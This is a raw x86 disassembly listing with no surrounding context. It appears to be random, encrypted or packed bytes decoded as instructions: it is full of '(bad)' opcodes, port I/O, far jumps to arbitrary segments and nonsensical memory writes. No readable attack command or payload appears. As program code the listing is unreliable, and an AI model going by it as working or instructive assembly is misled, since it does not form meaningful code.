  41c2ce:	ins    DWORD PTR es:[edi],dx
  41c2cf:	mov    esi,?
  41c2d1:	xchg   ebp,eax
  41c2d2:	push   esi
  41c2d3:	or     eax,0xa31129f
  41c2d8:	mov    ds:0xc9df7dda,eax
  41c2dd:	xor    esp,DWORD PTR [edx-0x5a]
  41c2e0:	adc    cl,BYTE PTR [ecx]
  41c2e2:	xchg   esi,eax
  41c2e3:	add    BYTE PTR [ebp+0x6a0bcc87],dh
  41c2e9:	cmp    DWORD PTR [ecx+0x49],0xd1e77a9b
  41c2f0:	test   al,0x4b
  41c2f2:	mov    esp,0xa6d34801
  41c2f7:	mov    ds:0xa8908c,al
  41c2fc:	cmp    eax,0xe6243238
  41c301:	and    ebx,0xffffffe1
  41c304:	sbb    ecx,ebx
  41c306:	mov    bh,0xa1
  41c308:	mov    ebp,0x8ca63b4
  41c30d:	popa   
  41c30e:	sub    eax,0x32b54485
  41c313:	(bad)  
  41c314:	xchg   ebp,eax
  41c315:	rol    DWORD PTR ds:0x81ae3ba8,0x1a
  41c31c:	ror    BYTE PTR [eax-0x2008d7dc],cl
  41c322:	das    
  41c323:	pop    ecx
  41c324:	stos   BYTE PTR es:[edi],al
  41c325:	mov    al,BYTE PTR [edi-0x2]
  41c328:	jb     0x41c395
  41c32a:	test   eax,0xc0b95ab5
  41c32f:	not    bl
  41c331:	jb     0x41c362
  41c333:	push   ebx
  41c334:	fwait
  41c335:	sub    BYTE PTR [ebx+0x2f7c8f2],ah
  41c33b:	ficom  DWORD PTR [ecx+0x77250e1e]
  41c341:	mov    ecx,0xdd08f16d
  41c346:	sub    ch,BYTE PTR [ebx]
  41c348:	push   esp
  41c349:	adc    eax,0x2865b621
  41c34e:	cmp    eax,ebx
  41c350:	sbb    eax,0xb4aa4503
  41c355:	sbb    cl,BYTE PTR [ecx+0x68]
  41c358:	adc    DWORD PTR [ebx-0x24],esi
  41c35b:	jmp    0x41c30e
  41c35d:	ins    BYTE PTR es:[edi],dx
  41c35e:	scas   al,BYTE PTR es:[edi]
  41c35f:	int    0x4d
  41c361:	jns    0x41c35b
  41c363:	cmp    DWORD PTR ds:0x84bf60a8,ebp
  41c369:	enter  0xc9d5,0xf5
  41c36d:	loop   0x41c3ec
  41c36f:	jb     0x41c3b9
  41c371:	sub    edx,edi
  41c373:	jmp    0xff55:0x76d5df1d
  41c37a:	scas   eax,DWORD PTR es:[edi]
  41c37b:	into   
  41c37c:	es cwde 
  41c37e:	dec    ecx
  41c37f:	mov    ss,WORD PTR [ecx]
  41c381:	(bad)  
  41c382:	xlat   BYTE PTR ds:[ebx]
  41c383:	jl     0x41c340
  41c385:	sbb    dh,dl
  41c387:	(bad)  
  41c389:	inc    edi
  41c38a:	sbb    ebx,DWORD PTR [edx-0x3b4a281d]
  41c390:	cli    
  41c391:	clc    
  41c392:	(bad)  
  41c393:	mov    cl,0x1a
  41c395:	cwde   
  41c396:	ret    
  41c397:	mov    dh,BYTE PTR [ebx+0x20f4bfdf]
  41c39d:	xchg   ebx,eax
  41c39e:	add    eax,DWORD PTR [edx+edx*4-0x1c964adc]
  41c3a5:	xchg   edx,eax
  41c3a6:	adc    esp,DWORD PTR [edi+0xf41cbdb]
  41c3ac:	(bad)  
  41c3ad:	nop
  41c3ae:	stos   DWORD PTR es:[edi],eax
  41c3af:	add    esi,DWORD PTR [ecx+0x4f32b1b6]
  41c3b5:	in     al,dx
  41c3b6:	mov    ecx,0x2a40ce2e
  41c3bb:	out    0xcc,eax
  41c3bd:	xchg   esp,eax
  41c3be:	sbb    eax,0xa1346e90
  41c3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3c4:	jae    0x41c408
  41c3c6:	dec    ebp
  41c3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c8:	ret    
  41c3c9:	inc    edi
  41c3ca:	push   ebx
  41c3cb:	jecxz  0x41c3e7
  41c3cd:	xchg   edx,eax
  41c3ce:	or     DWORD PTR [edx+0x1c498f84],esp
  41c3d4:	push   0x11
  41c3d6:	(bad)  
  41c3d7:	ins    DWORD PTR es:[edi],dx
  41c3d8:	jb     0x41c373
  41c3da:	adc    esp,DWORD PTR [ebx-0x6b]
  41c3dd:	cmp    esi,DWORD PTR [eax+0x43]
  41c3e0:	cdq    
  41c3e1:	push   es
  41c3e2:	fcom   st(4)
  41c3e4:	pop    ecx
  41c3e5:	sbb    DWORD PTR [edi-0x6affa5b1],esi
  41c3eb:	jo     0x41c3ee
  41c3ed:	push   es
  41c3ee:	jne    0x41c3c7
  41c3f0:	int3   
  41c3f1:	stos   BYTE PTR es:[edi],al
  41c3f2:	jg     0x41c37a
  41c3f4:	add    al,0xe3
  41c3f6:	sub    DWORD PTR [ebp-0x18],ebx
  41c3f9:	jge    0x41c39d
  41c3fb:	pop    es
  41c3fc:	pop    ebp
  41c3fd:	xor    eax,DWORD PTR [ebp-0x3a82c2a9]
  41c403:	or     al,0x96
  41c405:	inc    eax
  41c406:	test   eax,0x74cee8b7
  41c40b:	inc    ebx
  41c40c:	push   0x56
  41c40e:	inc    ebx
  41c40f:	mov    esp,0xeb8f760f
  41c414:	jle    0x41c3d2
  41c416:	repz and bl,ch
  41c419:	xchg   ebx,eax
  41c41a:	fmul   QWORD PTR [esi]
  41c41c:	xchg   sp,ax
  41c41e:	imul   ecx,DWORD PTR ds:0x7dabc535,0xc118c6a9
  41c428:	sar    bl,1
  41c42a:	sub    eax,0x99f8cc78
  41c42f:	leave  
  41c430:	adc    bh,cl
  41c432:	test   al,0xb7
  41c434:	scas   eax,DWORD PTR es:[edi]
  41c435:	addr16 loope 0x41c481
  41c438:	repnz cmc 
  41c43a:	add    dh,BYTE PTR [esi+0x50eeebbe]
  41c440:	mov    ds:0xa315ae20,eax
  41c445:	cmp    DWORD PTR [ebp+eax*2-0x732db168],ecx
  41c44c:	ja     0x41c449
  41c44e:	xchg   DWORD PTR ds:0xca5fd3a3,ecx
  41c454:	sbb    al,0xf5
  41c456:	lods   eax,DWORD PTR ds:[esi]
  41c457:	call   0xcf93:0xacc9837b
  41c45e:	add    DWORD PTR [esi-0x62776ca],ecx
  41c464:	xor    ebx,0xffffffb5
  41c467:	call   0xf0d0:0x4f090ec2
  41c46e:	aad    0xda
  41c470:	(bad)  
  41c471:	jnp    0x41c428
  41c473:	(bad)  
  41c474:	call   0x8f14:0xa9d6a4d7
  41c47b:	mov    ch,0x30
  41c47d:	push   ss
  41c47e:	fcom   QWORD PTR [ecx+0x25]
  41c481:	dec    ebp
  41c482:	cld    
  41c483:	mov    edx,0xd3032824
  41c488:	fld    DWORD PTR [esi-0x2fe64d25]
  41c48e:	out    0xd6,al
  41c490:	out    0xa0,eax
  41c492:	aam    0xb5
  41c494:	in     al,0x8e
  41c496:	xor    edx,DWORD PTR [ebp-0xa482aa2]
  41c49c:	push   ebp
  41c49d:	sbb    DWORD PTR [edx],esi
  41c49f:	inc    esi
  41c4a0:	(bad)  
  41c4a2:	and    cl,BYTE PTR [ecx]
  41c4a4:	scas   al,BYTE PTR es:[edi]
  41c4a5:	dec    esp
  41c4a6:	cmp    eax,0x43e7bc16
  41c4ab:	adc    eax,0x26f283fb
  41c4b0:	pushf  
  41c4b1:	test   al,0xae
  41c4b3:	stc    
  41c4b4:	pusha  
  41c4b5:	adc    DWORD PTR [edx],ebp
  41c4b7:	out    dx,eax
  41c4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4ba:	stos   BYTE PTR es:[edi],al
  41c4bb:	inc    ecx
  41c4bc:	daa    
  41c4bd:	pop    ss
  41c4be:	into   
  41c4bf:	push   0x7d3b4dcc
  41c4c4:	and    ebx,ebp
  41c4c6:	stc    
  41c4c7:	ins    DWORD PTR es:[edi],dx
  41c4c8:	xchg   DWORD PTR [edi-0x58],ecx
  41c4cb:	jmp    ebp
  41c4cd:	jnp    0x41c495
  41c4cf:	sub    ah,BYTE PTR [ecx+0x27a79649]
  41c4d5:	cdq    
  41c4d6:	adc    ch,BYTE PTR [esi+0x10]
  41c4d9:	xor    ebx,0x9c1a4926
  41c4df:	(bad)  
  41c4e1:	test   DWORD PTR [ebp-0x36],eax
  41c4e4:	ror    DWORD PTR [eax],1
  41c4e6:	xor    al,0x2d
  41c4e8:	sbb    al,0x82
  41c4ea:	lds    esi,FWORD PTR [edi]
  41c4ec:	pop    eax
  41c4ed:	and    edi,DWORD PTR [ecx-0x1c56cd53]
  41c4f3:	jmp    0xb5540071
  41c4f8:	jmp    0x35d1:0x113a057
  41c4ff:	in     eax,dx
  41c500:	data16 mov ah,0x2a
  41c503:	div    DWORD PTR [edx+0x11]
  41c506:	pushf  
  41c507:	push   ss
  41c508:	fsub   DWORD PTR [esi]
  41c50a:	and    al,0x71
  41c50c:	and    bl,dl
  41c50e:	push   edx
  41c50f:	cmp    eax,0x764bd780
  41c514:	aam    0xa8
  41c516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c517:	mov    esi,0x53593963
  41c51c:	dec    eax
  41c51d:	cmp    ebp,eax
  41c51f:	mov    BYTE PTR [eax-0x34166274],ch
  41c525:	push   0xffffff97
  41c527:	clc    
  41c528:	ja     0x41c51f
  41c52a:	pop    ss
  41c52b:	pop    ss
  41c52c:	gs mov bl,0x65
  41c52f:	inc    ecx
  41c530:	add    DWORD PTR [esi+edx*8],ebx
  41c533:	jp     0x41c55d
  41c535:	inc    ebp
  41c536:	rcl    BYTE PTR [ecx+0x576ff7bb],1
  41c53c:	push   esp
  41c53d:	dec    esi
  41c53e:	mov    edx,ecx
  41c540:	sbb    DWORD PTR [ecx],ebx
  41c542:	jb     0x41c4ec
  41c544:	pop    edi
  41c545:	push   edi
  41c546:	nop
  41c547:	inc    ecx
  41c548:	js     0x41c556
  41c54a:	pop    ds
  41c54b:	mov    ch,0x98
  41c54d:	inc    edx
  41c54e:	lds    edi,FWORD PTR [ebp+0x34]
  41c551:	ret    
  41c552:	fwait
  41c553:	inc    ecx
  41c554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c555:	outs   dx,DWORD PTR ds:[esi]
  41c556:	cli    
  41c557:	or     BYTE PTR [eax],al
  41c559:	mov    eax,ds:0x5c48ee27
  41c55e:	pop    es
  41c55f:	stc    
  41c560:	add    DWORD PTR [esi+0x3331e6c9],esi
  41c566:	fsin   
  41c568:	jmp    0x5477:0x7164cfd4
  41c56f:	scas   eax,DWORD PTR es:[edi]
  41c570:	test   eax,0x87840a3a
  41c575:	mov    ch,0xfe
  41c577:	dec    esp
  41c578:	adc    DWORD PTR [ebx-0xf9aaad5],eax
  41c57e:	test   eax,0x5487fa0f
  41c583:	scas   eax,DWORD PTR es:[edi]
  41c584:	jp     0x41c5da
  41c586:	or     DWORD PTR [ebx],0xf03a2c5
  41c58c:	data16 sbb BYTE PTR [edx+0x705f38b0],ah
  41c593:	frstor [esi]
  41c595:	mov    al,0xc3
  41c597:	mov    edi,0x58c0266e
  41c59c:	fild   QWORD PTR [ecx]
  41c59e:	loope  0x41c53b
  41c5a0:	repnz or DWORD PTR ds:0x4e72dd1e,esp
  41c5a7:	jmp    0xecd9:0xae9405e5
  41c5ae:	lock xchg ah,bh
  41c5b1:	inc    ebx
  41c5b2:	push   ds
  41c5b3:	ret    
  41c5b4:	and    ah,dl
  41c5b6:	dec    edx
  41c5b7:	retf   
  41c5b8:	rcr    BYTE PTR [ecx],cl
  41c5ba:	repz jp 0x41c5a9
  41c5bd:	and    eax,0x4999fc2a
  41c5c2:	xor    al,0x8f
  41c5c4:	inc    ecx
  41c5c5:	inc    ebp
  41c5c6:	jge    0x41c640
  41c5c8:	mov    BYTE PTR [edi+0x7a9ec23],dl
  41c5ce:	cld    
  41c5cf:	add    BYTE PTR cs:[eax+0x192c9657],cl
  41c5d6:	enter  0xaaf0,0xb8
  41c5da:	add    edx,ecx
  41c5dc:	es sbb bl,cl
  41c5df:	(bad)  
  41c5e1:	les    esp,FWORD PTR [ebx+0x216fd3ef]
  41c5e7:	test   DWORD PTR [edx+0x1ac86344],esi
  41c5ed:	mov    ebx,0x4ce3368a
  41c5f2:	pop    ebx
  41c5f3:	jmp    0xcdfe:0x6ec92271
  41c5fa:	push   0xffffff88
  41c5fc:	(bad)  
  41c5fd:	push   ds
  41c5fe:	stc    
  41c5ff:	pop    ecx
  41c600:	mov    WORD PTR [ecx+0x33f890ba],cs
  41c606:	repz inc esi
  41c608:	shl    DWORD PTR [ecx+ebx*8+0x3],cl
  41c60c:	(bad)  
  41c60f:	push   ds
  41c610:	ds pop eax
  41c612:	aad    0xf4
  41c614:	adc    DWORD PTR [edx-0x2a],edi
  41c617:	lods   al,BYTE PTR ds:[esi]
  41c618:	in     al,0x8a
  41c61a:	xchg   esp,eax
  41c61b:	in     eax,0x54
  41c61d:	nop
  41c61e:	dec    esp
  41c61f:	call   0xcec3e16e
  41c624:	hlt    
  41c625:	jl     0x41c607
  41c627:	dec    esp
  41c628:	fst    DWORD PTR [ecx+0x473fe96c]
  41c62e:	mul    ah
  41c630:	fild   DWORD PTR [esi]
  41c632:	(bad)  
  41c634:	loope  0x41c69f
  41c636:	inc    esi
  41c637:	push   ecx
  41c638:	mov    dl,0xf5
  41c63a:	(bad)  
  41c63b:	idiv   DWORD PTR [ebp+0x28]
  41c63e:	adc    eax,0xd1af5d8
  41c643:	cli    
  41c644:	scas   al,BYTE PTR es:[edi]
  41c645:	(bad)  
  41c646:	jmp    0x2955:0x5e6d32cb
  41c64d:	jno    0x41c5d4
  41c64f:	ins    DWORD PTR es:[edi],dx
  41c650:	xchg   ebx,ebp
  41c652:	rcr    ch,1
  41c654:	test   eax,0xfe75905
  41c659:	push   ebp
  41c65a:	or     eax,0x653e8570
  41c65f:	outs   dx,BYTE PTR ds:[esi]
  41c660:	das    
  41c661:	lods   eax,DWORD PTR ds:[esi]
  41c662:	sub    BYTE PTR [eax-0x43],al
  41c665:	cmp    BYTE PTR [ecx],bh
  41c667:	and    DWORD PTR [edi+ecx*1+0x23d8f63d],edi
  41c66e:	inc    ebp
  41c66f:	xlat   BYTE PTR ds:[ebx]
  41c670:	(bad)  
  41c671:	rcr    DWORD PTR [edi+0x4b75bd1],cl
  41c677:	shl    DWORD PTR [edx+0x138e4ac9],cl
  41c67d:	adc    esp,ebp
  41c67f:	and    ebp,DWORD PTR [ecx+0x54228b55]
  41c685:	pop    ss
  41c686:	ss je  0x41c651
  41c689:	outs   dx,BYTE PTR ds:[esi]
  41c68a:	cmp    ebp,ecx
  41c68c:	mov    esp,0xc662c714
  41c691:	inc    esi
  41c692:	pop    esi
  41c693:	pop    eax
  41c694:	cld    
  41c695:	fst    QWORD PTR [esi+0x6ba5f711]
  41c69b:	test   eax,0xf3b0dfea
  41c6a0:	repnz xor edx,DWORD PTR ss:[ebx+0x66491664]
  41c6a8:	cmc    
  41c6a9:	cmp    esp,DWORD PTR [ebx]
  41c6ab:	adc    al,0xd9
  41c6ad:	mov    al,cl
  41c6af:	outs   dx,DWORD PTR ds:[esi]
  41c6b0:	jmp    0x655f2923
  41c6b5:	clc    
  41c6b6:	xor    eax,0x5cbc54a2
  41c6bb:	aad    0x60
  41c6bd:	sbb    DWORD PTR [ebx-0x11],ecx
  41c6c0:	lock mov eax,0x371358a0
  41c6c6:	je     0x41c725
  41c6c8:	mov    ah,0x41
  41c6ca:	aam    0x8c
  41c6cc:	hlt    
  41c6cd:	lods   al,BYTE PTR ds:[esi]
  41c6ce:	data16 jns 0x41c6ce
  41c6d1:	mov    edx,esp
  41c6d3:	sub    DWORD PTR [eax+0x23fcdfc2],esp
  41c6d9:	mov    edi,DWORD PTR [eax+0xeacd07a]
  41c6df:	aas    
  41c6e0:	jo     0x41c71f
  41c6e2:	dec    edi
  41c6e3:	push   ebx
  41c6e4:	add    al,0x3d
  41c6e6:	imul   ebp,DWORD PTR [ebx+0x451a7c7a],0x9a8235cd
  41c6f0:	sub    dl,BYTE PTR [ebp+0x3a18bd97]
  41c6f6:	xchg   edx,eax
  41c6f7:	sbb    bh,BYTE PTR [ebx]
  41c6f9:	ret    
  41c6fa:	mov    al,ds:0x14d12731
  41c6ff:	inc    DWORD PTR [ebx+0x31]
  41c702:	jmp    0x439b2ed
  41c707:	mov    DWORD PTR [edx],esp
  41c709:	jecxz  0x41c711
  41c70b:	jmp    0x41c77f
  41c70d:	fiadd  DWORD PTR [eax+eiz*2-0x73]
  41c711:	(bad)
  41c714:	shl    BYTE PTR [ecx],cl
  41c716:	add    BYTE PTR [ebp+0x4],0x7c
  41c71a:	mov    ds:0x34783152,eax
  41c71f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c720:	and    eax,0x577ca1a2
  41c725:	sbb    eax,0xf8a20c12
  41c72a:	retf   0xfea9
  41c72d:	push   0xd246bc7
  41c732:	and    al,0xc1
  41c734:	mov    ecx,0x42703511
  41c739:	pop    es
  41c73a:	jb     0x41c6eb
  41c73c:	mov    al,0x53
  41c73e:	inc    ecx
  41c73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c740:	test   eax,0x112326b6
  41c745:	enter  0x2d94,0xb8
  41c749:	or     ah,BYTE PTR [edi]
  41c74b:	pavgb  mm3,QWORD PTR [edi+ecx*2-0x2d793361]
  41c753:	(bad)  
  41c754:	aam    0x40
  41c756:	push   edx
  41c757:	mov    ah,0x95
  41c75a:	push   ebx
  41c75b:	mov    ecx,0x35ba37b5
  41c760:	mov    dl,0x14
  41c762:	xor    esp,DWORD PTR [esi+0x23f11712]
  41c768:	mov    esp,esp
  41c76a:	nop
  41c76b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c76c:	mov    DWORD PTR [ebx],ecx
  41c76e:	inc    ebp
  41c76f:	mov    dh,0x34
  41c771:	outs   dx,BYTE PTR ds:[esi]
  41c772:	inc    edi
  41c773:	sar    DWORD PTR [edi],1
  41c775:	mov    WORD PTR [edx-0x5d7211da],ss
  41c77b:	fs jp  0x41c7a2
  41c77e:	fild   DWORD PTR [ebp-0xb]
  41c781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c782:	pushf  
  41c783:	std    
  41c784:	or     eax,0xb0b80b92
  41c789:	add    al,0xbf
  41c78b:	adc    esp,DWORD PTR [eax]
  41c78d:	ret    0x5ca
  41c790:	adc    DWORD PTR [edi+0x45],eax
  41c793:	icebp  
  41c794:	sbb    ah,BYTE PTR [edi+edx*8-0x3b]
  41c798:	sub    BYTE PTR [edi-0x61ff2305],cl
  41c79e:	xchg   esi,eax
  41c79f:	pop    esp
  41c7a0:	sub    ah,BYTE PTR [ecx]
  41c7a2:	dec    ecx
  41c7a3:	repz push eax
  41c7a5:	neg    BYTE PTR [edx+ebp*1+0x6883de21]
  41c7ac:	stc    
  41c7ad:	cwde   
  41c7ae:	add    BYTE PTR [ebp+0x6b],ch
  41c7b1:	pop    edx
  41c7b2:	sbb    BYTE PTR [ebx-0x13],ah
  41c7b5:	inc    esp
  41c7b6:	add    esp,DWORD PTR [ecx-0x16]
  41c7b9:	sbb    al,0x3
  41c7bb:	popf   
  41c7bc:	jl     0x41c7c9
  41c7be:	xor    eax,0xae907351
  41c7c3:	mov    bl,0x6e
  41c7c5:	and    al,0x8b
  41c7c7:	mov    dh,0x8d
  41c7c9:	xchg   BYTE PTR [ebx],dh
  41c7cb:	shr    DWORD PTR [ebx-0x78103cca],0x25
  41c7d2:	add    al,0x8e
  41c7d4:	(bad)  
  41c7d5:	cwde   
  41c7d6:	add    edx,DWORD PTR [esi+0x11dd43d1]
  41c7dc:	push   0x5b
  41c7de:	popf   
  41c7df:	aam    0x88
  41c7e1:	fwait
  41c7e2:	xor    bh,BYTE PTR [ecx+0x3a]
  41c7e5:	sub    ah,BYTE PTR [eax+edi*4-0x63]
  41c7e9:	adc    dl,0x83
  41c7ec:	rcr    DWORD PTR [esi+0x590ffce],1
  41c7f2:	sbb    DWORD PTR [edx-0x2b95e520],esi
  41c7f8:	sti    
  41c7f9:	std    
  41c7fa:	mov    ah,BYTE PTR ds:0xa48e33e1
  41c800:	test   BYTE PTR [eax],0x62
  41c803:	and    DWORD PTR [edi],ebx
  41c805:	xchg   ebp,eax
  41c806:	leave  
  41c807:	ds out 0x97,al
  41c80a:	loop   0x41c7fe
  41c80c:	aad    0x1c
  41c80e:	fistp  WORD PTR [esi+0x5c]
  41c811:	outs   dx,BYTE PTR ds:[esi]
  41c812:	add    ebp,edx
  41c814:	xor    ebp,DWORD PTR [esi+edi*8-0x37b3e555]
  41c81b:	loope  0x41c7bf
  41c81d:	mov    eax,ss
  41c81f:	mov    ds:0xb38a8cee,al
  41c824:	enter  0xead4,0x82
  41c828:	outs   dx,BYTE PTR ds:[esi]
  41c829:	out    dx,eax
  41c82a:	or     dl,cl
  41c82c:	mov    es,WORD PTR [esi]
  41c82e:	les    esp,FWORD PTR [ebx]
  41c830:	stos   BYTE PTR es:[edi],al
  41c831:	jnp    0x41c835
  41c833:	or     esp,DWORD PTR [ebp-0x194fd62f]
  41c839:	rcr    BYTE PTR [esi+ebp*2+0x422b1443],0xf6
  41c841:	outs   dx,BYTE PTR ds:[esi]
  41c842:	sub    eax,0xb195bcd1
  41c847:	mov    dl,0xbf
  41c849:	sub    al,0x27
  41c84b:	and    ah,BYTE PTR [ecx+0x5722ca16]
  41c851:	cmc    
  41c852:	enter  0xe31f,0x3b
  41c856:	and    ch,BYTE PTR [edx+0x6b90f94d]
  41c85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c85d:	jmp    0x41c8d7
  41c85f:	hlt    
  41c860:	pushf  
  41c861:	js     0x41c882
  41c863:	cwde   
  41c864:	sbb    eax,DWORD PTR [esi+0x2e]
  41c867:	fstp   TBYTE PTR [eax+0x2b]
  41c86a:	jle    0x41c819
  41c86c:	mov    dl,0xf6
  41c86e:	ds adc eax,0xe342b923
  41c874:	pop    ds
  41c875:	xor    al,0xd4
  41c877:	and    eax,esi
  41c879:	outs   dx,DWORD PTR ds:[esi]
  41c87a:	loop   0x41c8a1
  41c87c:	sbb    ah,cl
  41c87e:	mov    ds:0xb556638f,al
  41c883:	pop    esi
  41c884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c885:	cmp    eax,0x58f84e40
  41c88a:	out    0xdc,eax
  41c88c:	aam    0xae
  41c88e:	out    dx,al
  41c88f:	pop    ebp
  41c890:	or     edi,DWORD PTR [ebx-0x74a88169]
  41c896:	mov    bl,0xcc
  41c898:	cmp    edi,eax
  41c89a:	push   eax
  41c89b:	std    
  41c89c:	arpl   bp,si
  41c89e:	clc    
  41c89f:	jecxz  0x41c853
  41c8a1:	xchg   ebp,eax
  41c8a2:	xchg   bh,cl
  41c8a4:	arpl   WORD PTR [eax],bx
  41c8a6:	add    eax,0xd050edc
  41c8ab:	fcmovu st,st(0)
  41c8ad:	sahf   
  41c8ae:	call   0x321a:0x2bb9fbcf
  41c8b5:	sub    eax,0x1f7f9a27
  41c8ba:	lock sbb DWORD PTR [ecx],ebx
  41c8bd:	fisubr DWORD PTR [ebx]
  41c8bf:	sbb    bl,al
  41c8c1:	mov    bl,0x99
  41c8c3:	pop    ebp
  41c8c4:	mov    ah,0xb3
  41c8c6:	sub    al,dh
  41c8c8:	or     al,0x3c
  41c8ca:	ins    BYTE PTR es:[edi],dx
  41c8cb:	bound  ebp,QWORD PTR [ecx+0x5a]
  41c8ce:	fnstcw WORD PTR [eax+0x36d4a40d]
  41c8d4:	retf   
  41c8d5:	sub    dh,BYTE PTR [edi+0xdf69be0]
  41c8db:	pop    edx
  41c8dc:	push   edx
  41c8dd:	xor    dl,0x58
  41c8e0:	arpl   WORD PTR [bp+si],sp
  41c8e3:	data16 aaa 
  41c8e5:	add    DWORD PTR [ebp-0x51e2b3bc],ebp
  41c8eb:	imul   ebp,DWORD PTR [esi-0x28],0x73c120ed
  41c8f2:	cmp    esp,0xffffffa1
  41c8f5:	popa   
  41c8f6:	aad    0x91
  41c8f8:	push   es
  41c8f9:	scas   al,BYTE PTR es:[edi]
  41c8fa:	test   esp,esp
  41c8fc:	mov    esp,0x4bc795cb
  41c901:	xor    al,0x63
  41c903:	std    
  41c904:	enter  0x64f9,0x7b
  41c908:	mov    cl,0x89
  41c90a:	lea    edi,[eax+0x45]
  41c90d:	(bad)  
  41c90e:	xor    dh,ah
  41c910:	sub    edx,DWORD PTR [ecx-0x678b46fa]
  41c916:	adc    edi,ecx
  41c918:	js     0x41c8b6
  41c91a:	sbb    BYTE PTR [ebx],dh
  41c91c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c91d:	(bad)  
  41c91e:	jge    0x41c91a
  41c920:	pop    es
  41c921:	dec    esi
  41c922:	add    ebx,edi
  41c924:	fnsave [ebp+0x71dedccb]
  41c92a:	cs xchg ebp,eax
  41c92c:	push   esp
  41c92d:	pop    es
  41c92e:	add    bl,BYTE PTR [ebx]
  41c930:	push   cs
  41c931:	cmp    ah,BYTE PTR [ebx+0x59]
  41c934:	(bad)  
  41c935:	aaa    
  41c936:	test   BYTE PTR ds:0x38214aba,dh
  41c93c:	sbb    DWORD PTR [esp+ebp*2],esi
  41c93f:	sub    ebx,DWORD PTR [eax-0x59]
  41c942:	push   esi
  41c943:	in     eax,dx
  41c944:	popa   
  41c945:	out    0xc1,eax
  41c947:	jne    0x41c94f
  41c949:	outs   dx,BYTE PTR ds:[esi]
  41c94a:	aad    0xdf
  41c94c:	jae    0x41c966
  41c94e:	stc    
  41c94f:	mov    edi,0x8726c17e
  41c954:	pop    esp
  41c955:	adc    al,0xcd
  41c957:	ins    DWORD PTR es:[edi],dx
  41c958:	clc    
  41c959:	mov    esi,0x98c471f9
  41c95e:	cmp    DWORD PTR [ebp-0x173778fe],eax
  41c964:	inc    ebp
  41c965:	sub    al,cl
  41c967:	fisub  DWORD PTR [ecx-0x69]
  41c96a:	push   edi
  41c96b:	sub    eax,0xc33478b3
  41c970:	xchg   BYTE PTR [ecx-0x17],bh
  41c973:	les    ebx,FWORD PTR [esi-0x4f]
  41c976:	retf   
  41c977:	jmp    0x41c97b
  41c979:	mov    ebp,0x1dc2021
  41c97e:	sub    cl,dl
  41c980:	movzx  esp,WORD PTR [edi]
  41c983:	int    0x21
  41c985:	enterw 0xb54f,0xed
  41c98a:	pop    esp
  41c98b:	dec    ebp
  41c98c:	ss pop edi
  41c98e:	xchg   BYTE PTR [eax+0x516f9fff],bl
  41c994:	sub    eax,0xbc223b9a
  41c999:	jge    0x41c9a6
  41c99b:	jmp    0xb49bb077
  41c9a0:	push   cs
  41c9a1:	and    bl,BYTE PTR [edx+0xe]
  41c9a4:	iret   
  41c9a5:	cli    
  41c9a6:	xchg   ecx,eax
  41c9a7:	xchg   edi,eax
  41c9a8:	add    ebx,esp
  41c9aa:	idiv   esp
  41c9ac:	sub    ch,ch
  41c9ae:	cld    
  41c9af:	call   0xe9d5:0xe6b63e12
  41c9b6:	out    dx,eax
  41c9b7:	sub    DWORD PTR [edx],esi
  41c9b9:	xchg   ebp,eax
  41c9ba:	jo     0x41ca27
  41c9bc:	mov    ds:0xaf89c3a7,al
  41c9c1:	xchg   esp,eax
  41c9c2:	cmp    eax,0x9073f9c8
  41c9c7:	sub    BYTE PTR [eax+0x51],bl
  41c9ca:	enter  0x76bd,0x97
  41c9ce:	ret    
  41c9cf:	jg     0x41c9b7
  41c9d1:	or     eax,0x1b51fac6
  41c9d6:	call   0x12fb:0x366ee9b4
  41c9dd:	jmp    0x41c9e9
  41c9df:	mov    ah,0xe3
  41c9e1:	mov    BYTE PTR ds:0x411e2538,ah
  41c9e7:	outs   dx,BYTE PTR fs:[esi]
  41c9e9:	push   ecx
  41c9ea:	mov    gs,ebp
  41c9ec:	cld    
  41c9ed:	cmc    
  41c9ee:	in     eax,0xea
  41c9f0:	sbb    DWORD PTR [esi-0x75],edi
  41c9f3:	cmp    BYTE PTR [ebp+0x5ad94cfb],ah
  41c9f9:	popf   
  41c9fa:	shl    edx,cl
  41c9fc:	push   0x8604d9d4
  41ca01:	cdq    
  41ca02:	test   DWORD PTR [ecx],ebx
  41ca04:	mov    edx,edi
  41ca06:	js     0x41ca44
  41ca08:	mov    eax,ds:0xa361962f
  41ca0d:	xor    esi,DWORD PTR [esi+eiz*4-0x68845a70]
  41ca14:	cmp    DWORD PTR [ecx+0x644be9bc],0xffffff91
  41ca1b:	in     eax,dx
  41ca1c:	add    DWORD PTR [eax],esp
  41ca1e:	div    DWORD PTR [esi+0xa]
  41ca21:	push   edi
  41ca22:	cmp    eax,0x62fb6589
  41ca27:	push   esi
  41ca28:	call   0xcc0d:0xf78c20bb
  41ca2f:	sub    ebx,edx
  41ca31:	jbe    0x41c9d4
  41ca33:	neg    BYTE PTR [esi+0x4f]
  41ca36:	adc    BYTE PTR [edx-0xa],ch
  41ca39:	lea    edi,[ebp+0x55]
  41ca3c:	int    0x34
  41ca3e:	icebp  
  41ca3f:	mov    WORD PTR [edx+ecx*2],ds
  41ca42:	cmp    WORD PTR [edx+0x543295f],bp
  41ca49:	adc    eax,0x8b1bfa24
  41ca4e:	int    0xa2
  41ca50:	std    
  41ca51:	lds    esp,FWORD PTR [ebx-0x1799ea33]
  41ca57:	push   edi
  41ca58:	cmp    DWORD PTR [edi+0x7c44fc6b],edx
  41ca5e:	in     al,0x44
  41ca60:	mov    edx,0x62cd2f33
  41ca65:	cmp    edi,DWORD PTR [edx]
  41ca67:	sbb    al,0xdf
  41ca69:	fidiv  WORD PTR [ebx+edx*8-0x78]
  41ca6d:	retf   
  41ca6e:	mov    al,ds:0x2fd75f6e
  41ca73:	dec    ebx
  41ca74:	mul    bl
